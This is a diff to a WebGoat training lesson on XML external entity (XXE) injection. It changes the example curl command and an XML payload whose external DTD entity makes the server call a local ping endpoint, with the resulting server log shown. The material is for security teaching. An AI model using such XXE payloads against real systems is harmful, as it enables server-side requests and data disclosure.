@@ -8,11 +8,11 @@ Our WebGoat server by default has an /xxe/ping endpoint which we can use. *This 
 
 [source]
 ----
-curl -i http://localhost:8080/WebGoat/XXE/ping
+curl -i http://localhost:8080/WebGoat/XXE/ping?text=HelloWorld
 
 will result in:
 
-GET curl/7.45.0
+GET curl/7.45.0 HelloWorld
 ----
 
 at the server side.
@@ -33,12 +33,12 @@ Now submit the form and change the xml to:
 ----
 <?xml version="1.0"?>
 <!DOCTYPE root [
-<!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/XXE/attack.dtd">
+<!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/XXE/attack.dtd">
 %remote;
 ]>
-<user>
-  <username>test&ping;</username>
-</user>
+<comment>
+  <text>test&ping;</text>
+</comment>
 ----
 
 Now if we check our server log we will see:
@@ -48,7 +48,8 @@ Now if we check our server log we will see:
 GET Java/1.8.0_101 HelloWorld
 ----
 
-So with the XXE we are able to ping our own server which means XXE injection is possible.
+So with the XXE we are able to ping our own server which means XXE injection is possible. So with the XXE injection
+we are basically able to reach the same effect as we did in the beginning with the curl command.
 
 [NOTE]
 In this case we use http://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd to fetch the dtd but in reality this will
